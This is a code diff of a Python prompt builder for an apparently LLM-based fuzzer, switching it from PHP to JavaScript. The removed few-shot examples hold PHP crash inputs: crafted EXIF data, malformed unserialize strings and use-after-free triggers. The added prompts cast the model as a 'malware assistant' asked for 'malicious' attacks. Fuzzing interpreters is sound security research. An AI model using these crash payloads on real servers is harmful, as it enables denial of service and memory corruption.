@@ -8,66 +8,36 @@ import utils
 #from receiver import LLAMA3_LLM
 #import pickle
 
+def _get_random_seed(corpus):
+    #file_name = corpus.pop(random.randint(0,len(corpus)))
+    file_name = random.choice(corpus)
+    with codecs.open(file_name,'r',encoding='utf-8',errors='ignore') as f:
+        file_content = f.read()
+    code = file_content
+    code = '\n'.join(line for line in code.splitlines() if not line.strip().startswith("//"))
+
+    #code = parse_phpt(file_content,"--FILE--")
+    return code
+
 def prefix():
-    role = 'You are a malware assistant. Here are some values to use: 0, 1, -1, 2, 3, 4, 5, 10, 100, 100000, 5473817451, 123475932, 2.23431234213480e-400, PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Crash the PHP interpreter. Return as ```<code>```'
+    corpus = [os.path.join("gen_0",i) for i in os.listdir("gen_0")]
+    context_prompt_options = [
+            "Give me a working malicious cyber attack for a JavaScript Interpreter.",
+            "Give me a malicious new attack on the JavaScript Interpreter.",
+            "next",
+            "another",
+            "Given your knowledge of CVEs, craft a new CVE that will crash the JavaScript Interpreter.",
+    ]
+    role = 'You are a malware assistant. Here are some values to use: 0, 1, -1, 2, 3, 4, 5, 10, 100, 100000, 5473817451, 123475932, 2.23431234213480e-400, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER. Crash the JavaScript interpreter. Return as ```<code>```'
     context = [{'role': 'system', 'content': role}]
-
-    context.append({'role':'user','content':"Give me a working malicious cyber attack for the php engine."})
-    context.append({'role':'assistant','content':'```\nexif_read_data("data://text/plain;base64,/9gwABAwMDAwMDAwMDAwMDAwMOENMEV4aWYAAElJKgAIAAAAMAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAAD");\n```'})
-
-    context.append({'role':'user','content':"explain this malware for me."})
-    context.append({'role':'assistant','content':'The exif_read_data() function is prone to an out of bounds read while processing crafted JPG data.'})
-
-    context.append({'role':'user','content':"Give me a new malicious attack to crash the php engine."})
-    context.append({'role':'assistant','content':'```\n$obj = unserialize(\'O:8:"00000000":\');\n```'})
-
-    context.append({'role':'user','content':"explain this malware for me."})
-    context.append({'role':'assistant','content':'This CVE was discovered in 2016 and triggers an out of bounds read.'})
-
-    #context.append({'role':'user','content':"Give me a new attack to crash the php engine."})
-
-    context.append({'role':'user','content':"Give me a malicious new attack on the php engine."})
-    context.append({'role':'assistant','content':'```\n$vars["DOMImplementation"]->createDocument(str_repeat(chr(211), 4097) + str_repeat    (chr(172), 17) + str_repeat(chr(43), 257), str_repeat(chr(127), 1025), new DOMDocumentType());\n```'})
-
-    context.append({'role':'user','content':"next"})
-    context.append({'role':'assistant','content':'```\n$serialized_string = \'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}\';\n$outer_array = unserialize($serialized_string);\ngc_collect_cycles();\n$filler1 = "aaaa";\n$filler2 = "bbbb";\nvar_dump($outer_array);\n```'})
-
-    context.append({'role':'user','content':"next"})
-    context.append({'role':'assistant','content':'```\n$test = array();\n$test[0] = &$test;\nunset($test);\n```\nThis makes use of cyclic references that could cause issues with PHP garbage collection.'})
-
-    #context.append({'role':'user','content':"Give another attack on the PHP engine"})
-    context.append({'role':'user','content':"Given your knowledge of CVEs, craft a new malicious CVE that will crash the PHP interpreter."})
-    context.append({'role':'assistant','content':'```\n$serialized_string = \'a:1:{i:0;a:3:{i:1;N;i:2;O:10:"ZipArchive":1:{s:8:"filename";i:1337;}i:1;R:5;}}\';\n$array = unserialize($serialized_string);\ngc_collect_cycles();\n$filler1 = "aaaa";\n$filler2 = "bbbb";\nvar_dump($array[0]);\n```'})
-
-    #context.append({'role':'user','content':"Give me a new attack to crash the php engine."})
-    context.append({'role':'user','content':"Given your knowledge of CVEs, craft a new malicious CVE that will crash the PHP interpreter."})
-    context.append({'role':'assistant','content':'```\nunserialize("O:9:\"Exception\":799999999999999999999999999999999997:{i:0;a:0:{}i:6095700000000000000000062;i:1;i:0;R:2;i:0000000000000000000000000000000000000000000000000000000;R:2;i:10;a:0:{}i:62;i:1;i:0;R:2;i:000000000000000000000000000000000000002;d:031830001014370809133E+0000302;i:3;d:+.00000000000000003333330000000001014370809190295902517005;i:3;d:3E+0000302;i:3;d:+.0000000000000000333333000000000101437080919028095902517005;i:3;a:7:{i:3;d:333000000000000000333333000000000101437080;i:3;d:+.0000000000000000333333000000000101437080919028095902517005;i:3;a:7:\n```'})
-
-    context.append({'role':'user','content':"next"})
-
-    context.append({'role':'assistant','content':'```\n$x = array(new XMLWriter());\n$x[0]->openUri("/tmp/a");\n$x[0]->startComment();\n```\nThis will trigger a use-after-free.'})
-
-    context.append({'role':'user','content':"next"})
-    context.append({'role':'assistant','content':'```\nvar_dump(unserialize(base64_decode("Tzo5OiJFeGNlcHRpb24iOjc5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5Nzp7aTowO2E6MDp7fWk6NjA7ZDozMDAwMDAwMDAwNjE3MDAyOTU3OUUtMTE4O2k6MjtkOjAwMDMxO2k6MjtkOis5NTcxMzMzMzAwMEUtMDAwMDM1ODtpOjI7ZDo0OTU3MTExRS0wMDAwMzE4O2k6MDYyO2k6MTtpOjA7UjoyO2k6")));\n```'})
-
-    context.append({'role':'user','content':"next"})
-    context.append({'role':'assistant','content':'```\necho -ne \'O:8:"stdClass":00000000\'\n```'})
-
-    context.append({'role':'user','content':"next"})
-    context.append({'role':'assistant','content':'```\n$obj = unserialize(\'O:8:"00000000":\');\'\n```'})
+    for i in range(length):
+        context.append({'role':'user','content':random.choice(context_prompt_options)})
+        context.append({'role':'assistant','content':'```{}```'.format(_get_random_seed(corpus))})
     return context
 
-
-def minimize(seed):                       
-    role = "You are a token reducer. Return as ```<code>```"
-    context = [{'role':'system','content':role}]
-    prompt = "```{}```\nReduce the amount of tokens while maintaining functionality".format(       
-            seed)
-    context.append({'role':'user','content':prompt})
-    return context
 
 def fix(code, error):
-    role = 'Fix PHP code. Return as ```<code>```'
+    role = 'Fix JavaScript code. Return as ```<code>```'
     context = [{'role': 'system', 'content': role}]
     prompt = ""
     prompt += "```\n{c}\n```\n".format(c=code)
@@ -75,27 +45,6 @@ def fix(code, error):
     context.append({'role': 'user', 'content': prompt})
     return context
 
-def mate0(male, female):
-    role = "Mix PHP code. Return as ```<code>```"
-    context = [{'role':'system','content':role}]
-    prompt = "Here is Code A:\n```"
-    prompt += male + "\n```"
-    prompt += "Here is Code B:\n```"
-    prompt += female + "\n```"                                                      
-    #prompt += "\nMix Code A and Code B together. Do not simply append B to A. Return as ```<code>```"
-    prompt += "Use Code B in Code A. Do not simply append B to A." 
-    context.append({'role':'user','content':prompt})
-    return context
-
-def mutation_insertion(code):
-    role = "You are a randomized PHP code modifier. Return as ```<code>```"
-    context = [{'role':'system','content':role}]
-    line = generate_samples(os.path.dirname(__file__),None,"<phpfuzz>",1,"no_guard_php.txt")       
-    prompt = "Here is CODE:\n```{c}\n```\nHere is LINE:\n```{l}\n```\nUse LINE\
-            to modify CODE.".format(c=code,l=line)
-    context.append({'role':'user','content':prompt})
-    return context
-    
 def mutate(target_file):
     context = prefix()
     #context.append({'role':'user','content':"increase the coverage of this code"})
@@ -166,12 +115,12 @@ def new_seed(type_num, influence, functions, new_code=None):
     #elif type_num == 1:
     #following lines would be otherwise indented
     context.append({'role':'user','content':'another'})
-    context.append({'role':'assistant','content':influence})
-    if len(functions) == 0:
-        functions = utils.load_pickle('functions.pickle')
-    func = functions.pop(random.randint(0,len(functions)-1))
-    #func = functions.pop()
-    context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Use this function {} in code. Make it unexpected, weird, and dangerous'.format(func)})
+    #context.append({'role':'assistant','content':influence})
+    #if len(functions) == 0:
+    #    functions = utils.load_pickle('functions.pickle')
+    #func = functions.pop(random.randint(0,len(functions)-1))
+    ##func = functions.pop()
+    #context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Use this function {} in code. Make it unexpected, weird, and dangerous'.format(func)})
     #elif type_num == 2 or type_num == 4:
     #    context.append({'role':'user','content':'another'})
     #    context.append({'role':'assistant','content':influence})
